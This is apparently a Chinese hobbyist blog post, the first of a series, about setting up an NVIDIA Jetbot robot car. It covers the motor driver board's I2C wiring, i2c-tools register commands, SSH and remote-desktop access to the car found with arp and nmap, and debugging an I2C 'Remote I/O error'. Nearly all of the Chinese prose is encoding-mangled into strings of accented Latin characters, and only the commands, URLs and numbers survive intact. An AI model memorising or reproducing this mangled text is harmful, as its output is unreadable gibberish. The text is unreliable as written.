é©¬è¾¾å’Œå…¶é©±åŠ¨æ¿:ä¸‹æ–‡é‡ç‚¹è®²è§£ å¼€å‘æ¿å°±å¯ä»¥è¿è¡Œä¸€ä¸ªå®Œæ•´çš„Ubuntuç³»ç»Ÿ,å…¶ä½™è®¾å¤‡æ˜¯ä¸ºå…¶æ‹“å±•åŠŸèƒ½çš„.\nç¡¬ä»¶æ¶æ„ï¼šé©±åŠ¨èŠ¯ç‰‡å’ŒI2Cä¸»çº¿ æˆ‘åœ¨ç©å°è½¦çš„è¿‡ç¨‹ä¸­è€½è¯¯æœ€é•¿æ—¶é—´çš„å°±æ˜¯ç”µæœºï¼ˆå³é©¬è¾¾ï¼‰é©±åŠ¨äº†ï¼Œå€Ÿæ­¤è®²ä¸€è®²ç³»ç»Ÿæ¶æ„çš„äº‹ã€‚\nè®©è½®å­å‰è¿›è¦é é©¬è¾¾ï¼Œç»™é©¬è¾¾ä¾›ç”µä¸èƒ½ç›´æ¥è®©ä¸»æ¿æ¥åšï¼Œè¦è®©ä¸»æ¿ç»™å¦ä¸€å—å°èŠ¯ç‰‡å‘é€æŒ‡ä»¤ï¼Œè¿™å—å°èŠ¯ç‰‡è¿æ¥ç€ç‹¬ç«‹çš„ç”µæºï¼Œæ”¶åˆ°æŒ‡ä»¤æ‰ä¼šç»™é©¬è¾¾é€šç”µã€‚è¿™å—å°èŠ¯ç‰‡å³æ˜¯ç”µæœºé©±åŠ¨æ¿ã€‚\né©±åŠ¨èŠ¯ç‰‡æ˜¯ä»ç¡¬ä»¶èµ°å‘è½¯ä»¶çš„ç¬¬ä¸€é“æ¡¥æ¢ï¼Œå¯ä»¥ç±»æ¯”PCçš„IOè®¾å¤‡æ¥ç†è§£ã€‚å’Œç‰©ç†ä¸–ç•Œäº¤äº’çš„å„ç§åŠŸèƒ½ï¼Œéƒ½éœ€è¦æœ‰ä¸“é—¨çš„é©±åŠ¨èŠ¯ç‰‡ã€‚åŒ…æ‹¬é©¬è¾¾ï¼Œæ‘„åƒå¤´ï¼Œæ‰¬å£°å™¨ï¼Œæœºæ¢°è‡‚ç­‰ç­‰ï¼Œåªä¸è¿‡æœ‰çš„å¯ä»¥é›†æˆåœ¨ä¸€èµ·ï¼Œå¦‚ï¼šå°è½¦ä¸Šçš„æ‘„åƒå¤´ï¼ŒPiOLEDæ˜¾ç¤ºå™¨ç­‰ï¼›æœ‰çš„å‡ºäºä½“ç§¯ï¼Œå®‰å…¨æ€§ï¼Œæ¨¡å—åŒ–çš„è€ƒè™‘éœ€è¦åˆ†å¼€ï¼Œå¦‚ç”µæœºå’Œé©±åŠ¨æ¿ã€‚\nç”µæœºé©±åŠ¨æ¿ å®˜æ–¹ç»™å‡ºçš„ç”µæœºé©±åŠ¨æ¿å‹å·ä¸º:DC-Stepper-Motor PCA9685+TB6612.å¯ä»¥é©±åŠ¨ä¸¤ä¸ªæ­¥è¿›ç”µæœºæˆ–å››ä¸ªç›´æµç”µæœºã€‚ï¼ˆå››è½´é£è¡Œå™¨gkdï¼‰æœ¬é¡¹ç›®åªç”¨åˆ°äº†ä¸¤ä¸ªç›´æµç”µæœºã€‚\nå„ä¸ªå¼•è„šçš„è®²è§£ï¼šhttps://learn.adafruit.com/adafruit-stepper-dc-motor-featherwing/pinouts\nç”µæœºé©±åŠ¨æ¿ä¸Šå…±è¿æ¥æœ‰10æ ¹è·³çº¿ã€‚ä¸€å¯¹ç”µæºè¾“å…¥ï¼Œä¸¤å¯¹ä¸ºé©¬è¾¾è¾“å‡ºã€‚è¿˜éœ€å››æ ¹æ¯-æ¯æœé‚¦çº¿æ¥è¿æ¥è‡³ä¸»æ¿çš„I2Cæ€»çº¿,å…·ä½“æ¥è¯´,æ˜¯åœ¨LEDå±æ—è¾¹çš„æ‹“å±•æ¿ã€‚åˆ†åˆ«æ˜¯ï¼š\né©±åŠ¨æ¿å¼•è„š ä¸»æ¿I2Cå¼•è„š åŠŸèƒ½ 3V3 3V3 ä¸ºé©±åŠ¨æ¿ä¾›ç”µ,å³ç”µæºæ­£æ GND GND æ¥åœ°,å³ç”µæºè´Ÿæ SDA 3 ä¸²è¡Œæ•°æ®çº¿ï¼Œä¼ è¾“æ•°æ® SCL 5 ä¸²è¡Œæ—¶é’Ÿçº¿ï¼Œä¼ è¾“æ§åˆ¶ä¿¡å· ã€å›¾ç‰‡ï¼šé©±åŠ¨æ¿å¼•è„šã€‘\næ¥é”™äº†æœ‰å¯èƒ½çƒ§åæ¿å­å“¦\nI2Cæ€»çº¿ æ‰€è°“æ€»çº¿,å¯ä»¥ç†è§£ä¸ºä¸€æ¡è¡—é“,æ¯ä¸ªè®¾å¤‡å°±æ˜¯è¡—é“ä¸¤æ—çš„æˆ¿å­,æˆ¿å†…çš„ä½æˆ·å‡ºé—¨èµ°äº²è®¿å‹å°±æ˜¯æ•°æ®åœ¨ä¸åŒè®¾å¤‡é—´çš„ä¼ è¾“ã€‚\nI2Cæ€»çº¿æ˜¯å¸¸ç”¨äºåµŒå…¥å¼ç³»ç»Ÿçš„ä¸€ç§ç®€æ˜“ä¸²è¡Œæ€»çº¿.ä»–æœ‰ç®€æ´çš„åŒçº¿ç»“æ„(SCL+SDA),æ¯ä¸ªè®¾å¤‡éƒ½æœ‰ä¸€ä¸ªåœ°å€ç ,ä»¥æ­¤å®ç°å¤šä¸ªè®¾å¤‡ç›¸äº’é€šè®¯ã€‚è®¾å¤‡æœ‰ä¸»ä»ä¹‹åˆ†ï¼Œä¸»è®¾å¤‡/ä¸»ç«¯å¿…é¡»æ˜¯å¸¦æœ‰CPUçš„é€»è¾‘æ¨¡å—ï¼Œåœ¨åŒä¸€æ€»çº¿ä¸ŠåŒä¸€æ—¶åˆ»ä½¿èƒ½æœ‰ä¸€ä¸ªä¸»ç«¯ï¼Œå¯ä»¥æœ‰å¤šä¸ªä»ç«¯ï¼Œä»ç«¯çš„æ•°é‡å—åœ°å€ç©ºé—´å’Œæ€»çº¿çš„æœ€å¤§ç”µå®¹ 400pFçš„é™åˆ¶ã€‚\nå¯ä»¥ä½¿ç”¨i2c-toolsè°ƒè¯•i2cæ€»çº¿:\næ£€æµ‹æœ‰å‡ ç»„i2cæ€»çº¿åœ¨ç³»ç»Ÿä¸Ši2cdetect -l æ£€æµ‹æŒ‚è½½åœ¨i2c-1ä¸Šçš„è®¾å¤‡i2cdetect -r -y 1 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 a b c d e f 00: -- -- -- -- -- -- -- -- -- -- -- -- -- 10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- --ï¼ˆledï¼‰ 40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 60: 60 -- -- -- -- -- -- -- -- -- -- -- -- -- -- --ï¼ˆç”µæœºé©±åŠ¨ï¼‰ 70: 70 -- -- -- -- -- -- -- æŸ¥çœ‹è®¾å¤‡(åœ°å€ä¸º0x20)ä¸Šæ‰€æœ‰å¯„å­˜å™¨çš„å€¼i2cdump -f -y 1 0x20\nå¯¹å•ä¸ªå¯„å­˜å™¨è¿›è¡Œè¯»å†™:\ni2cset -f -y 1 0x20 0x77 0x3f ï¼ˆè®¾ç½®i2c-1ä¸Š0x20å™¨ä»¶çš„0x77å¯„å­˜å™¨å€¼ä¸º0x3fï¼‰\ni2cget -f -y 1 0x20 0x77 ï¼ˆè¯»å–i2c-1ä¸Š0x20å™¨ä»¶çš„0x77å¯„å­˜å™¨å€¼ï¼‰\njetson-nanoå¼€å‘æ¿æä¾›äº†6æ¡I2Cä¸»çº¿,ä»¥åŠå…¶ä»–ä¸°å¯Œçš„æ¥å£ã€‚ç†è§£è¿™äº›æ¥å£æ˜¯æ‹“å±•å„ç§è®¾å¤‡çš„å‰æã€‚\nè½¯ä»¶è¿æ¥:sshè¿œç¨‹æ¡Œé¢ ä»å¤´å¼€å§‹çš„è¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¾€sdå¡é‡Œçƒ§å†™ç³»ç»Ÿé•œåƒï¼Œä¸è¿‡æˆ‘æ‹¿åˆ°çš„å·²ç»å®Œæˆäº†è¿™ä¸€æ­¥éª¤ï¼Œæ•…ä¸å†èµ˜è¿°ã€‚\nåœ¨å®˜æ–¹æ•™ç¨‹ä¸­,éœ€è¦hdmiçº¿è¿æ¥æ˜¾ç¤ºå±,usbè¿æ¥é¼ æ ‡é”®ç›˜,æ¥è¿›å…¥jetson-nanoçš„Ubuntuç³»ç»Ÿ.å…¶ç›®çš„åœ¨äºé¦–æ¬¡è¿æ¥ä¸€ä¸ªæ— çº¿ç½‘ç»œ(æ‰‹æœºçƒ­ç‚¹),ä¹‹ååªè¦ç”µè„‘å’Œnanoåœ¨åŒä¸€ç½‘ç»œ,å³å¯ç”¨ç”µè„‘è®¿é—®nanoçš„IP(8888ç«¯å£),ç›´æ¥æ“çºµjetbot.\nç”±äºæˆ‘å¹¶æ²¡æœ‰hdmiçº¿,åªæœ‰ä¸€æ ¹ç½‘çº¿,åæ­£éƒ½èƒ½æ’,æ’è°ä¸ä¸€æ ·?æ‰€ä»¥ç”¨ç½‘çº¿æŠŠå°è½¦å’Œç¬”è®°æœ¬è¿æ¥èµ·æ¥ç»„æˆå±€åŸŸç½‘.ç”¨sshçš„æ–¹å¼è¿›å…¥nanoçš„ç³»ç»Ÿ.å…·ä½“æ­¥éª¤å¦‚ä¸‹:\nipå‘ç°:åœ¨æ’å…¥ç½‘çº¿å‰åæ‰§è¡Œä¸¤æ¬¡:arp -a,æ¯”è¾ƒä¸åŒ,ä¼šå‘ç°å¤šå‡ºä¸€ä¸ªåœ°å€,ç±»å‹ä¸ºåŠ¨æ€,æ­¤å³ä¸ºå°è½¦çš„å†…ç½‘IP.å°è½¦çš„ledå±ä¹Ÿä¼šè‡ªåŠ¨æ˜¾ç¤ºå…¶ip.å¦‚eth0:192.168.x.x\n(å¦‚æ­¤,æˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æµè§ˆå™¨è®¿é—®è¿™ä¸ªipçš„8888ç«¯å£,å¹¶èƒ½è¿è¡Œjupyter notebookäº†.ä½†æˆ‘ä»¬ä¸èƒ½è®©å°è½¦æ‹–ç€ç½‘çº¿è·‘å•Š,æ‰€ä»¥è¿˜æ˜¯è¦é…ç½®æ— çº¿ç½‘ç»œ.)\nå°†ç¬”è®°æœ¬çš„wifiè¿æ¥è®¾ä¸ºå¯¹ä»¥å¤ªç½‘å¯å…±äº«,è¿™ä¸€æ­¥æ˜¯ä¸ºäº†è®©å°è½¦èƒ½é€šè¿‡ç¬”è®°æœ¬è”ç½‘\nç«¯å£æ‰«æ:nmap -sT 192.168.x.xå‘ç°22ç«¯å£å¼€æ”¾,æ•…è¿æ¥ä¹‹:ssh jetbot@192.168.x.x,å°±ç”¨å®˜æ–¹æ•™ç¨‹ç»™çš„è´¦æˆ·å¯†ç .\nè¿æ¥æˆåŠŸå,å°±å¯ä»¥ç”¨å‘½ä»¤è¡Œå·¥å…·è¿æ¥WiFiäº†,ä½†è¿˜æ˜¯å®‰è£…ä¸€ä¸‹è¿œç¨‹æ¡Œé¢å§.\né…ç½®è¿œç¨‹æ¡Œé¢:æ‰§è¡Œä»¥ä¸‹å‘½ä»¤:\n1 2 3 sudo apt-get install tightvncserver sudo apt-get install xrdp sudo apt-get install vnc4server tightvncserver ä¹‹ååœ¨ä½ çš„ä¸»æœºwin+Rï¼Œè¾“å…¥mstsc,è¿›å…¥è¿œç¨‹ç™»å½•æ¡Œé¢ï¼Œè¾“å…¥å°è½¦çš„ipåœ°å€ï¼Œç‚¹å‡»è¿æ¥\nåœ¨xrdpçš„ç™»é™†ç•Œé¢è¾“å…¥ç”¨æˆ·åå¯†ç å³å¯æ‰“å¼€è¿œç¨‹æ¡Œé¢\n(è¿™é‡Œæˆ‘ç”¨jetbotç”¨æˆ·ç™»é™†é­é‡é—ªé€€,ç”¨rootå°±å¯ä»¥,ä¸æ¸…æ¥šåŸå› )(å¦å¤–å¼€äº†è¿œç¨‹æ¡Œé¢å†…å­˜ç–¯æ¶¨,å°±å¾ˆç¦»è°±)\nè¿æ¥ä¸Šwifiå,ä½ èƒ½åœ¨å°è½¦çš„ledæ¿ä¸Šçœ‹åˆ°å¦ä¸€ä¸ªip:wlan0:192.168.x.x\nä¸ç®¡æ€æ ·,è¿æ¥ä¸Šwifiä¹‹åçš„æ“ä½œå°±å¾ˆç®€å•äº†.è·Ÿç€æ•™ç¨‹,è·‘ä¸€è·‘demo,è¿˜æ˜¯å¾ˆæœ‰æˆå°±æ„Ÿçš„.\næ’æŸ¥bug ç„¶è€Œdemoå¹¶æ²¡æœ‰è®©æˆ‘è·‘å‡ºæ¥,ä¸”æŒ‡å‘åŒä¸€ä¸ªé”™è¯¯:\n1 OSError: [Errno 121] Remote I/O error æ²¿ç€jupyter notebookçš„æŠ¥é”™ä¸€ç›´èµ°,ä¸€ç›´åˆ°äº†æœ€åº•å±‚,å‘è®¾å¤‡å†™å…¥æ•°æ®æŠ¥é”™,remote IO error.\nçœ‹èµ·æ¥åƒæ˜¯ç¡¬ä»¶çš„é—®é¢˜ã€‚ä¸€æ­¥ä¸€æ­¥æ’æŸ¥å‘—\næ€€ç–‘è·³çº¿é”™è¯¯\næ›´æ¢è·³çº¿â€”â€”æ— æœ ç”¨ä¸‡ç”¨è¡¨æµ‹é‡çº¿ä¸¤ç«¯çš„ä¿¡å·â€”â€”æ­£å¸¸ï¼Œæ’é™¤è¿æ¥é—®é¢˜ æ—¶é’Ÿçº¿ä¿æŒ3.3væ¯éš”å‡ ç§’è·³åˆ°2.2våˆå›æ¥ï¼Œç»“åˆi2cçš„åŸç†åº”è¯¥æ˜¯æ­£å¸¸ç°è±¡ï¼Ÿ æ•°æ®çº¿åŒæ ·ä¿æŒ3.3vï¼Œé—´æ–­è·³è‡³2.3ï¼Œ2.0 è½¯ä»¶æ–¹æ³•æ£€éªŒè®¾å¤‡è¿æ¥æ€§\nç”¨i2ctoolså¯ä»¥æ£€æµ‹åˆ°è®¾å¤‡ï¼Œæ‹”ä¸‹4æ ¹æ¥çº¿ï¼Œåœ¨0x60,0x70å¤„çš„è®¾å¤‡æ¶ˆå¤±ï¼ˆä¸€ä¸ªæ˜¯i2cçº¿ï¼Œä¸€ä¸ªæ˜¯é€»è¾‘ä¾›ç”µï¼Ÿï¼‰ 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 a b c d e f 00: -- -- -- -- -- -- -- -- -- -- -- -- -- 10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- -- 40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 60: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 70: -- -- -- -- -- -- -- -- ç„¶è€Œï¼Œåœ¨é€šç”µçŠ¶æ€ä¸‹ï¼ŒæŠŠè¿çº¿æ‹”ä¸‹åˆæ’ä¸Šä¹‹åï¼Œi2cåˆèƒ½æ£€æµ‹åˆ°è®¾å¤‡ï¼Œç„¶åç¤ºä¾‹ä»£ç å°±èƒ½è¿è¡Œäº†ï¼Ÿï¼Ÿï¼Ÿ\nè¿·æƒ‘ã€‚æ‰€ä»¥å¼€æœºæ—¶æœºå™¨å¹¶æ²¡èƒ½æ­£ç¡®è½½å…¥è®¾å¤‡ï¼Œåå€’æ˜¯é‡æ–°è¿æ¥åèƒ½è¯†åˆ«äº†ï¼Ÿï¼Ÿï¼Ÿæœ¬æ¥æˆ‘éƒ½è¦æ¢é©±åŠ¨æ¿äº†ï¼Œorzã€‚\nåˆæˆ–è€…æ˜¯å’Œé©±åŠ¨æ¿ä¸Šçš„resetæŒ‰é’®æœ‰å…³ï¼Ÿç­‰ä¸‹æ¬¡é‡åˆ°é—®é¢˜å†è¯´å§ã€‚\næ‹¾é— linuxå†…å­˜å ç”¨ ledå±ä¼šæ˜¾ç¤ºå†…å­˜å ç”¨ï¼Œç„¶é¹…æ—¶é—´é•¿äº†æ€»ä¼šåˆ°90%ä»¥ä¸Šï¼Œå¯æˆ‘å¹¶æ²¡æœ‰è¿è¡Œä»€ä¹ˆç¨‹åºã€‚\nç»æŸ¥é˜…æ­¤å¤„æ˜¾ç¤ºçš„æ˜¯å®é™…å æœ‰çš„åŠ ä¸Šbufferå’Œcached meméƒ¨åˆ†ï¼Œå¯ä»¥ç†è§£ä¸ºç¼“å­˜çš„ï¼Œéšæ—¶æ¸…ç†ï¼Œå¹¶ä¸å ç”¨å®é™…å†…å­˜ã€‚\nå¯ç”¨topå‘½ä»¤æŸ¥çœ‹å†…å­˜è¯¦æƒ…ã€‚\nä¾›ç”µé—®é¢˜ ç”¨å……ç”µå®ä¾›ç”µæ–¹ä¾¿ï¼Œä½†æ˜¯åªè¦ä¸€æ–­ç”µç³»ç»Ÿå°±ä¼šé‡å¯ï¼Œè¿™å¯¹linuxç³»ç»Ÿè€Œè¨€ä¼¤å®³å¾ˆå¤§ã€‚\nè€Œåœ¨å……ç”µå®ç”µé‡ä¸æ»¡æ—¶ï¼Œç»å¸¸å‘ç”Ÿå¼€ä¸äº†æœºçš„é—®é¢˜ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºç”µé‡ä¸è¶³å¯¼è‡´ç”µå‹ä¸ç¨³ã€‚\nå…³æœºå‘½ä»¤ï¼š sudo shutdown -h now\né‡å¯ï¼š shutdown -h now -r\nä¸‹ä¸€ç¯‡ï¼šæ“çºµå°è½¦å’ŒAIåˆæ¢\nå‚è€ƒé“¾æ¥ https://github.com/NVIDIA-AI-IOT/jetbot/wiki/Hardware-Setup\nhttps://robocarstore.cn/\nhttp://www.gpus.cn/gpus_list_page_techno_support_content?id=50\nhttps://www.jianshu.com/p/789944463fd7\n","date":"2019-09-20T00:25:55Z","permalink":"https://lonelyuan.github.io/p/%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A8jetbot%E6%99%BA%E8%83%BD%E5%B0%8F%E8%BD%A6%E5%B0%9D%E9%B2%9C%E4%B8%80/","title":"å•ç‰‡æœºå…¥é—¨â€”â€”jetbotæ™ºèƒ½å°è½¦å°é²œ(ä¸€)"}]